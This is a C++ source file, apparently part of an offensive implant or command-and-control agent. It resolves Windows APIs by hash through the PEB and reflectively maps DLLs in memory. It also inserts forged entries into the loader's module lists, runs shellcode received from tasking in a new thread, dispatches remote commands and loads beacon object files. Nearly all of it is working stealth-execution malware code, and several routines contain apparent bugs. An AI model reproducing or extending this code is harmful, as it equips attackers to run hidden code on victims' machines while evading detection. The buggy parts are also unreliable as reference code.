#include <core/include/memory.hpp>

using namespace Hash;
using namespace Opsec;
using namespace Utils;
using namespace Parser;
using namespace Objects;
using namespace Threads;
using namespace Commands;
using namespace Memory::Modules;

namespace Memory {
    namespace Methods {

        UINT_PTR GetStackCookie() {
            HEXANE;

            UINT_PTR cookie = 0;
            if (!NT_SUCCESS(ntstatus = ctx->procapi.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
                return 0;
            }

            return cookie;
        }

        PRESOURCE GetIntResource(HMODULE base, CONST INT rsrc_id) {
            HEXANE;

            HRSRC rsrc_info		= { };
            PRESOURCE object	= (RESOURCE*) Malloc(sizeof(_resource));

            x_assert(rsrc_info          = ctx->utilapi.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
            x_assert(object->h_global   = ctx->utilapi.LoadResource(base, rsrc_info));
            x_assert(object->size       = ctx->utilapi.SizeofResource(base, rsrc_info));
            x_assert(object->rsrc_lock  = ctx->utilapi.LockResource(object->h_global));

        defer:
            return object;
        }

        PEXECUTABLE CreateImage(uint8 *data) {
            HEXANE;

            auto image = (EXECUTABLE*) Malloc(sizeof(_executable));

            image->buffer   = data;
            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(image->buffer) + ((PIMAGE_DOS_HEADER) data)->e_lfanew);
            image->symbols  = (PCOFF_SYMBOL) (B_PTR(image->buffer) + image->nt_head->FileHeader.PointerToSymbolTable);
            image->exports  = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(image->buffer) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            return image;
        }
    }

    namespace Context {

        BOOL ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
        	HEXANE;

            _hexane instance    = { };
            void *region        = { };

            instance.teb    = NtCurrentTeb();
            instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue    = ERROR_SUCCESS;
            instance.base.address           = U_PTR(InstStart());
            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;

            if (!(instance.modules.ntdll = (HMODULE) GetModuleEntry(NTDLL)->DllBase)) {
                return false;
            }

            F_PTR_HMOD(instance.memapi.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
            if (!instance.memapi.RtlAllocateHeap) {
                return false;
            }

            region = RVA(PBYTE, instance.base.address, &__instance);
            if (!(C_DREF(region) = instance.memapi.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                return false;
            }

            MemCopy(C_DREF(region), &instance, sizeof(_hexane));
            MemSet(&instance, 0, sizeof(_hexane));
            MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);

            return true;
        }

        VOID ContextDestroy() {
            HEXANE;
            // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)

            auto free = ctx->memapi.RtlFreeHeap;
            auto heap = ctx->heap;

            // free bof executables
            for (auto head = ctx->bof_cache; head; head = head->next) {
                RemoveCOFF(head->bof_id);
            }

            if (free) {
                free(heap, 0, ctx);
            }
        }
    }

    namespace Modules {
	    PLDR_DATA_TABLE_ENTRY GetModuleEntry(const uint32 hash) {
		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

		    for (auto next = head->Flink; next != head; next = next->Flink) {
			    const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			    const auto name = mod->BaseDllName;

			    // TODO: need checks to prevent overflows
			    wchar_t buffer[MAX_PATH] = { };

			    if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
				    return mod;
			    }
		    }

		    return nullptr;
	    }

	    PLDR_DATA_TABLE_ENTRY GetModuleEntryByName(const wchar_t *mod_name) {
		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

		    for (auto next = head->Flink; next != head; next = next->Flink) {
			    const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			    const auto name = mod->BaseDllName;

			    // TODO: need checks to prevent overflows
			    wchar_t buffer1[MAX_PATH] = { };
			    wchar_t buffer2[MAX_PATH] = { };

		    	if (WcsCompare(WcsToLower(buffer1, mod_name), WcsToLower(buffer2, name.Buffer)) == 0) {
				    return mod;
			    }
		    }

		    return nullptr;
	    }

	    FARPROC GetExportAddress(CONST VOID *base, CONST uint32 hash) {
		    FARPROC address = nullptr;

		    const auto nt_head = (PIMAGE_NT_HEADERS) (B_PTR(base) + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
		    const auto exports = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(base) + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);

		    if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
			    return address;
		    }

		    for (auto index = 0; index < exports->NumberOfNames; index++) {
			    const auto name = (char *) (base + ((uint32_t *) (base + exports->AddressOfNames))[index - 1]);

			    // TODO: need checks to prevent overflows
			    char buffer[MAX_PATH] = { };

			    if (hash - HashStringA(MbsToLower(buffer, name), MbsLength(name)) == 0) {
				    address = (FARPROC) (base + ((uint32_t *) (base + exports->AddressOfFunctions))[index]);
				    break;
			    }
		    }

		    return address;
	    }

	    BOOL FindModule(EXECUTABLE *module, wchar_t *filename) {
	    	HEXANE;

		    if (!filename) {
			    return false;
		    }

		    module->local_name		= filename;
		    module->cracked_name	= (wchar_t *) Malloc(MAX_PATH * sizeof(wchar_t));

		    if (!module->cracked_name) {
			    return false;
		    }

	    	// NOTE: search path for all modules limited to System32 folder
		// TODO: name hash search for known dlls in system path/concat names from FindFirstFile/FindNext results
	    	wchar_t location[MAX_PATH] = L"C:\\Windows\\System32\\";
	    	WcsConcat(location, filename);

	    	if (ctx->ioapi.GetFileAttributesW(location) == INVALID_FILE_ATTRIBUTES) {
	    		Free(module->cracked_name);
	    		return false;
	    	}

		    MemCopy(module->cracked_name, location, (WcsLength(location) % (MAX_PATH - 1)) * 2);
		    return true;
	    }

	    BOOL ReadModule(EXECUTABLE *module) {
	    	HEXANE;

		    HANDLE handle = ctx->ioapi.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
		    if (handle == INVALID_HANDLE_VALUE) {
			    return false;
		    }

		    SIZE_T size = ctx->ioapi.GetFileSize(handle, nullptr);
		    if (size == INVALID_FILE_SIZE) {
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (void **) &module->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    if (!ctx->ioapi.ReadFile(handle, module->buffer, size, (DWORD *) &module->size, nullptr)) {
		    	ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), (void **) &module->buffer, &module->size, 0);
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    ctx->utilapi.NtClose(handle);
		    return true;
	    }

    	PLIST_ENTRY FindHashTable() {

	    	PLIST_ENTRY list = nullptr;
	    	PLIST_ENTRY head = nullptr;
	    	PLIST_ENTRY entry = nullptr;
	    	PLDR_DATA_TABLE_ENTRY current = nullptr;

	    	PPEB peb = PEB_POINTER;

	    	head	= &peb->Ldr->InInitializationOrderModuleList;
	    	entry	= head->Flink;

	    	do
	    	{
	    		current = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);
	    		entry	= entry->Flink;

	    		if (current->HashLinks.Flink == &current->HashLinks) {
	    			continue;
	    		}

	    		list = current->HashLinks.Flink;

	    		if (list->Flink == &current->HashLinks) {
	    			ULONG hash = LdrHashEntry(current->BaseDllName, true);

	    			list = (PLIST_ENTRY) ((size_t)current->HashLinks.Flink - hash * sizeof(LIST_ENTRY));
	    			break;
	    		}

	    		list = nullptr;
	    	} while (head != entry);

	    	return list;
	    }

    	PRTL_RB_TREE FindModuleBaseAddressIndex() {

	    	SIZE_T stEnd = 0;
	    	PRTL_BALANCED_NODE node = nullptr;
	    	PRTL_RB_TREE index = nullptr;

	    	/*
				TODO:
				Implement these manually cause these could totally be hooked
				and various other reasons
			*/
	    	PLDR_DATA_TABLE_ENTRY entry = GetModuleEntry(NTDLL);
	    	node = &entry->BaseAddressIndexNode;

	    	do {
	    		node = (PRTL_BALANCED_NODE) (node->ParentValue & ~0x7);
	    	} while (node->ParentValue & ~0x7);

	    	if (!node->Red) {

	    		uint32 length	= 0;
	    		size_t stBegin	= 0;

	    		PIMAGE_NT_HEADERS pNtHeaders	= RVA(PIMAGE_NT_HEADERS, entry->DllBase, ((PIMAGE_DOS_HEADER) entry->DllBase)->e_lfanew);
	    		PIMAGE_SECTION_HEADER section	= IMAGE_FIRST_SECTION(pNtHeaders);

	    		for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
	    			uint32 sec_hash = HashStringA((char *) section->Name, MbsLength((char*) section->Name));

	    			// TODO: hash ".data"
	    			if (MemCompare(DOT_DATA, sec_hash, sizeof(uint32)) == 0) {
	    				stBegin = (size_t) entry->DllBase + section->VirtualAddress;
	    				length = section->Misc.VirtualSize;

	    				break;
	    			}

	    			++section;
	    		}

	    		for (DWORD i = 0; i < length - sizeof(size_t); ++stBegin, ++i) {
	    			size_t stRet = MemCompare((void *) stBegin, &node, sizeof(size_t));

	    			if (stRet == sizeof(size_t)) {
	    				stEnd = stBegin;
	    				break;
	    			}
	    		}

	    		if (stEnd == 0)
	    		{
	    			return nullptr;
	    		}

	    		PRTL_RB_TREE rb_tree = (PRTL_RB_TREE) stEnd;

	    		if (rb_tree && rb_tree->Root && rb_tree->Min) {
	    			index = rb_tree;
	    		}
	    	}

	    	return index;
	    }

    	BOOL AddBaseAddressEntry(PLDR_DATA_TABLE_ENTRY entry, void *base) {
	    	HEXANE;

	    	PRTL_RB_TREE index = FindModuleBaseAddressIndex();
	    	if (!index) {
	    		return false;
	    	}

	    	bool right_hand = false;
	    	PLDR_DATA_TABLE_ENTRY node = (PLDR_DATA_TABLE_ENTRY) ((size_t) index - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));

	    	do {
	    		// NOTE: looking for correct in-memory order placement according to RB Tree
	    		if (base < node->DllBase) {
	    			if (!node->BaseAddressIndexNode.Left) {
	    				break;
	    			}

	    			node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Left - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
	    		}
	    		else if (base > node->DllBase) {
	    			if (!node->BaseAddressIndexNode.Right) {
	    				right_hand = true;
	    				break;
	    			}

	    			node = (PLDR_DATA_TABLE_ENTRY) ((size_t)node->BaseAddressIndexNode.Right - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
	    		}
	    		else {
	    			node->DdagNode->LoadCount++;
	    		}
	    	} while (true);

	    	if (!ctx->memapi.RtlRbInsertNodeEx(index, &node->BaseAddressIndexNode, right_hand, &entry->BaseAddressIndexNode)) {
	    		return false;
	    	}

	    	return true;
	    }

	    BOOL LocalLdrGetExportAddress(HMODULE module, const MBS_BUFFER *fn_name, const uint16 ordinal, void **function) {

		    PIMAGE_NT_HEADERS nt_head		= nullptr;
		    PIMAGE_DATA_DIRECTORY data_dire = nullptr;
		    PIMAGE_SECTION_HEADER section	= nullptr;

		    if (!module) {
			    return false;
		    }

		    nt_head = RVA(PIMAGE_NT_HEADERS, module, ((PIMAGE_DOS_HEADER) module)->e_lfanew);
		    if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
			    return false;
		    }

		    void *text_start	= nullptr;
		    void *text_end		= nullptr;

		    for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
			    section = ITER_SECTION_HEADER(module, sec_index);
		    	uint32 hash = HashStringA((char *) section->Name, MbsLength((char *) section->Name));

		    	// TODO: hash ".text"
			    if (MemCompare(DOT_TEXT, hash, sizeof(uint32))) {
				    text_start	= RVA(PVOID, module, section->VirtualAddress);
				    text_end	= RVA(PVOID, text_start, section->SizeOfRawData);
				    break;
			    }
		    }

		    if (!text_start || !text_end) {
		    	// NOTE: not sure why this would happen
			    return false;
		    }

		    data_dire = &nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

		    if (data_dire->Size) {
			    PIMAGE_EXPORT_DIRECTORY exports = RVA(PIMAGE_EXPORT_DIRECTORY, module, data_dire->VirtualAddress);

			    int n_entries = fn_name != nullptr ? exports->NumberOfNames : exports->NumberOfFunctions;

			    for (int ent_index = 0; ent_index < n_entries; ent_index++) {

				    bool found = false;
				    uint32 fn_ordinal = 0;

				    if (!fn_name) {
					    uint32 *p_rva		= RVA(uint32 *, module, exports->AddressOfNames + ent_index * sizeof(uint32));
					    const char *name	= RVA(const char *, module, *p_rva);

					    if (MbsLength(name) != fn_name->length) {
						    continue;
					    }
					    if (MbsCompare(name, fn_name->buffer)) {
						    found = true;
						    short *p_rva2 = RVA(short *, module, exports->AddressOfNameOrdinals + ent_index * sizeof(uint16));
						    fn_ordinal = exports->Base + *p_rva2;
					    }
				    }
			    	else {
					    int16 *p_rva2 = RVA(short*, module, exports->AddressOfNameOrdinals + ent_index * sizeof(uint16));
					    fn_ordinal = exports->Base + *p_rva2;

					    if (fn_ordinal == ordinal) {
						    found = true;
					    }
				    }

				    if (found) {
					    const uint32 *pfn_rva = RVA(uint32 *, module, exports->AddressOfFunctions + sizeof(uint32) * (fn_ordinal - exports->Base));
					    void *fn_pointer = RVA(void *, module, *pfn_rva);

					    if (text_start > fn_pointer || text_end < fn_pointer) {
						    // this is ...

						    size_t full_length = MbsLength((char *) fn_pointer);
						    int lib_length = 0;

						    for (int i = 0; i < full_length; i++) {
							    if (((char *) fn_pointer)[i] == '.') {
								    lib_length = i;
								    break;
							    }
						    }
						    if (lib_length != 0) {
						    	// TODO: clean this up
							    size_t fn_length = full_length - lib_length - 1;
							    char lib_name[256] = { };

							    MbsCopy(lib_name, (char *) fn_pointer, lib_length);
							    MbsCopy(lib_name + lib_length, ".dll", 5);

						    	wchar_t wcs_lib[MAX_PATH * sizeof(wchar_t)] = { };
							    char *fn_name = (char *) fn_pointer + lib_length + 1;

						    	MBS_BUFFER mbs_fn_name = { };
						    	FILL_MBS(mbs_fn_name, fn_name);

						    	MbsToWcs(wcs_lib, lib_name, MbsLength(lib_name));
							    LDR_DATA_TABLE_ENTRY *lib_entry = GetModuleEntryByName(wcs_lib);

							    if (!lib_entry || lib_entry->DllBase == module) {
								    return false;
							    }

							    if (!LocalLdrGetExportAddress((HMODULE) lib_entry->DllBase, &mbs_fn_name, 0, &fn_pointer)) {
								    return false;
							    }
						    }
					    }
					    *function = fn_pointer;
					    return true;
				    }
			    }
		    }
		    return false;
	    }


	    BOOL ResolveImports(const EXECUTABLE *module) {

		    PIMAGE_IMPORT_BY_NAME import_name		= nullptr;
		    PIMAGE_DELAYLOAD_DESCRIPTOR delay_desc	= nullptr;
		    PIMAGE_THUNK_DATA first_thunk			= nullptr;
	    	PIMAGE_THUNK_DATA org_first				= nullptr;

		    IMAGE_DATA_DIRECTORY *data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	    	MBS_BUFFER mbs_import = { };

		    if (data_dire->Size) {
			    PIMAGE_IMPORT_DESCRIPTOR import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, module->base, data_dire->VirtualAddress);
		    	PIMAGE_IMPORT_DESCRIPTOR scan = import_desc;

			    DWORD count = 0;
			    for (; scan->Name; scan++) {
				    count++;
			    }

			    for (; import_desc->Name; import_desc++) {
			    	HMODULE library = nullptr;
			    	wchar_t lower[MAX_PATH * sizeof(wchar_t)] = { };

			    	const char *name = (char *) module->base + import_desc->Name;

			    	MbsToWcs(lower, name, MbsLength(name));
			    	WcsToLower(lower, lower);

				    if (LDR_DATA_TABLE_ENTRY *entry = GetModuleEntry(HashStringW(lower, WcsLength(lower)))) {
			    		library = (HMODULE) entry->DllBase;
			    	}
				    else {
				    	// recursive load
				    	wchar_t next_load[MAX_PATH] = { };
				    	MbsToWcs(next_load, name, MbsLength(name));

					    EXECUTABLE *new_load = LoadModule(LoadLocalFile, next_load, nullptr, 0, nullptr);
				    	if (!new_load || !new_load->success) {
				    		return false;
				    	}

				    	library = (HMODULE) new_load->base;
				    }

				    first_thunk	= RVA(PIMAGE_THUNK_DATA, module->base, import_desc->FirstThunk);
				    org_first	= RVA(PIMAGE_THUNK_DATA, module->base, import_desc->OriginalFirstThunk);

				    for (; org_first->u1.Function; first_thunk++, org_first++) {
					    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
						    if (!LocalLdrGetExportAddress(library, nullptr, (uint16) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
							    return false;
						    }
					    } else {
						    import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);
						    FILL_MBS(mbs_import, import_name->Name);

						    if (!LocalLdrGetExportAddress(library, &mbs_import, 0, (void **) &first_thunk->u1.Function)) {
								return false;
						    }
					    }
				    }
			    }
		    }

		    // handle the delayed import table
		    data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

		    if (data_dire->Size) {
			    delay_desc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, module->base, data_dire->VirtualAddress);

			    for (; delay_desc->DllNameRVA; delay_desc++) {
			    	HMODULE library = nullptr;

			    	const char *lib_name = (char *) module->base + delay_desc->DllNameRVA;
			    	wchar_t wcs_lib[MAX_PATH * sizeof(wchar_t)] = { };

			    	MbsToWcs(wcs_lib, lib_name, MbsLength(lib_name));

				    if (LDR_DATA_TABLE_ENTRY *entry = GetModuleEntryByName(wcs_lib)) {
			    		library = (HMODULE) entry->DllBase;
			    	}
				    else {
				    	// recursive load
					    EXECUTABLE *new_load = LoadModule(LoadLocalFile, wcs_lib, nullptr, 0, nullptr);
				    	if (!new_load || !new_load->success) {
				    		return false;
				    	}

				    	// TODO: memory leak here. Do something with this new module.
				    	library = (HMODULE) new_load->base;
				    }

				    first_thunk	= RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportAddressTableRVA);
				    org_first	= RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportNameTableRVA);

				    for (; org_first->u1.Function; first_thunk++, org_first++) {
					    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
						    if (!LocalLdrGetExportAddress(library, nullptr, (WORD) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
							    return false;
						    }
					    } else {
						    import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);
						    FILL_MBS(mbs_import, import_name->Name);

						    if (!LocalLdrGetExportAddress(library, &mbs_import, 0, (void **) &first_thunk->u1.Function)) {
							    return false;
						    }
					    }
				    }
			    }
		    }

		    return true;
	    }

	    BOOL MapSections(EXECUTABLE *module) {
		    HEXANE;

		    auto region_size		= (SIZE_T) module->nt_head->OptionalHeader.SizeOfImage;
		    const auto pre_base		= module->nt_head->OptionalHeader.ImageBase;

		    module->base = pre_base;

		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
			    module->base != pre_base) {

			    module->base	= 0;
			    region_size		= module->nt_head->OptionalHeader.SizeOfImage;

			    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
				    return false;
			    }
		    }

		    for (auto head_index = 0; head_index < module->nt_head->OptionalHeader.SizeOfHeaders; head_index++) {
			    B_PTR(module->base)[head_index] = module->buffer[head_index];
		    }

		    for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
			    for (auto sec_index = 0; sec_index < module->section->SizeOfRawData; sec_index++) {
				    (B_PTR(module->base + module->section->VirtualAddress))[sec_index] = (module->buffer + module->section->PointerToRawData)[sec_index];
			    }
		    }

		    UINT_PTR base_rva = module->base - pre_base;
		    PIMAGE_DATA_DIRECTORY relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		    // if non-zero rva and relocdir exists...
		    if ((module->base - pre_base) && relocdir) {
			    PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);

			    do {
				    PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY) reloc + 1;

				    do {
					    switch (head->Type) {
					    case IMAGE_REL_BASED_DIR64:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
					    case IMAGE_REL_BASED_HIGHLOW:	*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva; break;
					    case IMAGE_REL_BASED_HIGH:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
					    case IMAGE_REL_BASED_LOW:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
					    }
					    head++;
				    }
				    while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);

				    reloc = (PIMAGE_BASE_RELOCATION) head;
			    }
			    while (reloc->VirtualAddress);
		    }

		    module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
		    return true;
	    }

    	BOOL AddHashTableEntry(PLDR_DATA_TABLE_ENTRY entry) {

	    	PLIST_ENTRY hash_table = nullptr;
	    	PPEB peb = PEB_POINTER;

	    	INIT_LIST_ENTRY(&entry->HashLinks);

	    	hash_table = FindHashTable();
	    	if (!hash_table) {
	    		return false;
	    	}

	    	// insert into hash table
	    	ULONG hash = LdrHashEntry(entry->BaseDllName, true);

	    	InsertTailList(&hash_table[hash], &entry->HashLinks);
	    	InsertTailList(&peb->Ldr->InLoadOrderModuleList, &entry->InLoadOrderLinks);
	    	InsertTailList(&peb->Ldr->InMemoryOrderModuleList, &entry->InMemoryOrderLinks);
	    	InsertTailList(&peb->Ldr->InInitializationOrderModuleList, &entry->InInitializationOrderLinks);

	    	return true;
	    }

	    BOOL LinkModule(EXECUTABLE *module) {
	    	HEXANE;

		    PIMAGE_NT_HEADERS nt_head;
		    UNICODE_STRING FullDllName, BaseDllName;

		    nt_head = RVA(PIMAGE_NT_HEADERS, module->buffer, ((PIMAGE_DOS_HEADER)module->buffer)->e_lfanew);

		    ctx->utilapi.RtlInitUnicodeString(&FullDllName, module->local_name);
		    ctx->utilapi.RtlInitUnicodeString(&BaseDllName, module->cracked_name);

		    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) Malloc(sizeof(LDR_DATA_TABLE_ENTRY));
		    if (!entry) {
			    return false;
		    }

		    // start setting the values in the entry
		    ctx->enumapi.NtQuerySystemTime(&entry->LoadTime);

		    // do the obvious ones
		    entry->ReferenceCount = 1;
		    entry->LoadReason = LoadReasonDynamicLoad;
		    entry->OriginalBase = nt_head->OptionalHeader.ImageBase;

		    // set the hash value
		    entry->BaseNameHashValue = LdrHashEntry(BaseDllName, false);

		    // correctly add the base address to the entry
		    AddBaseAddressEntry(entry, (void *) module->base);

		    // and the rest
		    entry->ImageDll = true;
		    entry->LoadNotificationsSent = true; // :melt:
		    entry->EntryProcessed = true;
		    entry->InLegacyLists = true;
		    entry->InIndexes = true;
		    entry->ProcessAttachCalled = true;
		    entry->InExceptionTable = false;
		    entry->DllBase = (void *) module->base;
		    entry->SizeOfImage = nt_head->OptionalHeader.SizeOfImage;
		    entry->TimeDateStamp = nt_head->FileHeader.TimeDateStamp;
		    entry->BaseDllName = BaseDllName;
		    entry->FullDllName = FullDllName;
		    entry->ObsoleteLoadCount = 1;
		    entry->Flags = LDRP_IMAGE_DLL | LDRP_ENTRY_INSERTED | LDRP_ENTRY_PROCESSED | LDRP_PROCESS_ATTACH_CALLED;

		    // set the correct values in the Ddag node struct
		    entry->DdagNode = (PLDR_DDAG_NODE) Malloc(sizeof(LDR_DDAG_NODE));

		    if (!entry->DdagNode) {
			    return 0;
		    }

		    entry->NodeModuleLink.Flink = &entry->DdagNode->Modules;
		    entry->NodeModuleLink.Blink = &entry->DdagNode->Modules;
		    entry->DdagNode->Modules.Flink = &entry->NodeModuleLink;
		    entry->DdagNode->Modules.Blink = &entry->NodeModuleLink;
		    entry->DdagNode->State = LdrModulesReadyToRun;
		    entry->DdagNode->LoadCount = 1;

		    // add the hash to the hash_table
		    AddHashTableEntry(entry);

		    // set the entry point
		    entry->EntryPoint = (PLDR_INIT_ROUTINE) RVA(void *, module->base, nt_head->OptionalHeader.AddressOfEntryPoint);

		    return true;
	    }

	    PEXECUTABLE LoadModule(const uint32 load_type, wchar_t *filename, uint8 *memory, const uint32 mem_size, wchar_t *name) {
	    	// NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
	    	// everything loaded with this unit MUST RESIDE in System32 due to path finding limitations
	    	// may add more paths later, but it's not likely.
	    	HEXANE;

		    auto module = (EXECUTABLE *) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
		    if (!module) {
			    return nullptr;
		    }

		    module->success	= false;
		    module->link	= true;

		    switch (LOWORD(load_type)) {
		    	case LoadLocalFile:
				    if (!FindModule(module, filename) || !ReadModule(module)) {
					    goto defer;
				    }
				    break;

			    case LoadMemory:
				    module->size			= mem_size;
				    module->buffer			= memory;
				    module->cracked_name	= name;
				    module->local_name		= name;

				    if (name == nullptr) {
					    goto defer;
				    }
				    break;

			    default:
				    break;
		    }

		    if (load_type & NoLink)
			    module->link = false;

		    if (name == nullptr) {
			    name = module->cracked_name;
		    }

	    	if ((load_type & LoadBof) != LoadBof) {
			    if (LDR_DATA_TABLE_ENTRY *check_module = GetModuleEntry(HashStringW(name, WcsLength(name)))) {
				    module->base	= (uintptr_t) check_module->DllBase;
				    module->success = true;

				    goto defer;
			    }
	    	}

	    	const auto image = Methods::CreateImage(module->buffer);
		    if (!ImageCheckArch(image)) {
		    	goto defer;
		    }

	    	// TODO: DestroyImage(module);
	    	Free(image);

		    // map the sections into memory
		    if (!MapSections(module) || !ResolveImports(module)) {
			    goto defer;
		    }

		    if (module->link) {
			    if (!LinkModule(module)) {
				    goto defer;
			    }
		    }

		    // trigger tls callbacks, set permissions and call the entry point
		    if (!BeginExecution(module)) {
			    goto defer;
		    }

		    module->success = true;

	    defer:
	    	// TODO: delete the _executable* and keep the base. that's all I need tbh...
		    return module;
	    }


	    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
	    	// TODO:
		    return false;
	    }
    }

    namespace Execute {

        BOOL ExecuteCommand(_parser parser) {
            HEXANE;

            uintptr_t pointer = 0;

            const auto cmd_id = UnpackUint32(&parser);
            if (cmd_id == NOJOB) {
                return true;
            }

            if (!(pointer = GetCommandAddress(cmd_id))) {
                // LOG ERROR
                return false;
            }

            const auto cmd = (COMMAND) RVA(PBYTE, ctx->base.address, pointer);
            cmd(&parser);

            return true;
        }

        BOOL ExecuteShellcode(CONST PARSER &parser) {
            HEXANE;

            void *base      = nullptr;
            void (*exec)()  = nullptr;

        	HANDLE handle	= nullptr;
            BOOL success	= true;

            size_t size = parser.length;

            if (!NT_SUCCESS(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                // LOG ERROR
                success = false;
                goto defer;
            }

            MemCopy(base, parser.buffer, parser.length);

            if (!NT_SUCCESS(ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                // LOG ERROR
                success = false;
                goto defer;
            }

            exec = (void(*)()) base;
            ntstatus = ctx->threadapi.NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) exec, nullptr, NULL, NULL, NULL, NULL, nullptr);

            MemSet(base, 0, size);

        defer:
            if (base) {
                ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
            }

            return success;
        }

        VOID LoadObject(_parser parser) {
            HEXANE;

            COFF_PARAMS *bof  = (_coff_params *) Malloc(sizeof(_coff_params));
            COFF_PARAMS *saved = nullptr;

            bof->entrypoint = UnpackString(&parser, (uint32 *) &bof->entrypoint_length);
            bof->data       = UnpackBytes(&parser, (uint32 *) &bof->data_size);
            bof->args       = UnpackBytes(&parser, (uint32 *) &bof->args_size);
            bof->b_cache    = UnpackByte(&parser);
            bof->bof_id		= UnpackUint32(&parser);
            bof->task_id    = ctx->session.current_taskid;

            // TODO: with previously loaded BOFs (peer_id, task_id, msg_type, msg_length, [entrypoint, null, args, etc..])
            // TODO: test that bof data size being zero is a correct way to do this

            if (!bof->data_size) {
                saved = GetCOFF(bof->bof_id);

                bof->data      = saved->data;
                bof->data_size = saved->data_size;
            }

            if (!CreateUserThread(NtCurrentProcess(), (void *) COFFThread, bof, nullptr)) {
                // LOG ERROR
                // do not return
            }

            if (!saved) {
                AddCOFF(bof);
            }

            // NOTE: keep original task_id after every run or update (?)
